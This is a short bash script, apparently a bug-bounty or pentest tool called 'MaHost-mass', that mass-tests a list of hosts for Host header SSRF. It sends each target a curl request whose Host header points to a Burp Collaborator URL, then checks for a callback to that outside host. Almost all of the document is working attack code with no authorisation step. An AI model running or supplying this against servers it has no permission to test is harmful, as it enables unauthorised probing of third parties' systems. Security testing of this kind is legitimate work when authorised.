#!/bin/bash
# MaHost-mass v1.0
# Coded by kaiz3n



echo
echo
echo
echo "    _  __       _   _           _                                        _   ___   "
echo "  |  \/  | __ _| | | | ___  ___| |_      _ __ ___   __ _ ___ ___  __   _/ | / _ \  "
echo "  | |\/| |/ _' | |_| |/ _ \/ __| __|____| '_ ' _ \ / _' / __/ __| \ \ / / || | | | "
echo "  | |  | | (_| |  _  | (_) \__ \ ||_____| | | | | | (_| \__ \__ \  \ V /| || |_| | "
echo "  |_|  |_|\__,_|_| |_|\___/|___/\__|    |_| |_| |_|\__,_|___/___/   \_/ |_(_)___/  "
echo
echo
echo
echo "This is MaHost-mass v1.0 - Test many hosts at once to see if they are vulnerable to Host Header SSRF Attack via Burp Collaborator + Curl"
echo
echo "Please enter the file which contains hosts to test: (https://some.domain.com) "; read host
echo "Please enter your Burp Collaborator URL where you will receive requests: "; read burpcollaborator
echo
echo
echo "------------------------------------------------------------------------"
while IFS= read -r line
do
	echo "Tested: ${line} "
	echo "------------------------------------------------------------------------"
	curl -s -X GET -H "Host: ${burpcollaborator}" ${line} -I -L
	echo "------------------------------------------------------------------------"
done <"$host"
echo "------------------------------------------------------------------------"
echo
echo
echo "Let's see if it worked! Your response should have the following header: "
echo
echo "------------------------------------------------------------------------"
echo "**** Server: Burp Collaborator https://burpcollaborator.net/ ****"
echo "-------------------------------------------------------------------------"
echo
echo "If it does = SUCCESS (Check Burp Collaborator client for request); if it doesn't TRY AGAIN!"

